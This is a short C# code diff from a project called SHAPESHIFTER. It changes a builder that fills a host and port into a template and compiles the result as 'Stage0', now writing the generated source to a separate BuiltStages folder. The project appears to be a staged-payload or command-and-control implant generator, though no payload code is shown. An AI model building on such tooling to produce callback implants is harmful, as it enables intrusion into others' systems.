@@ -25,7 +25,8 @@ namespace SHAPESHIFTER
             string template = File.ReadAllText(sourceFile);
             string modified = template.Replace(@"[SHAPESHIFTER_HOST]", host);
             modified = modified.Replace(@"[SHAPESHIFTER_PORT]", port.ToString());
-            File.WriteAllText(sourceFile, modified);
+
+            File.WriteAllText(sourcePath + @"\BuiltStages\Stage0.cs", modified);
 
             CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
             CompilerParameters cParams = new CompilerParameters
@@ -48,7 +49,7 @@ namespace SHAPESHIFTER
             cParams.ReferencedAssemblies.Add("System.Xml.dll");
             cParams.ReferencedAssemblies.Add("System.Xml.Linq.dll");
 
-            CompilerResults results = provider.CompileAssemblyFromFile(cParams, sourceFile);
+            CompilerResults results = provider.CompileAssemblyFromFile(cParams, sourcePath + @"\BuiltStages\Stage0.cs");
             if (results.Errors.Count == 0)
             {
                 Console.WriteLine("[+] Stage0 compiled into {0}", results.PathToAssembly);
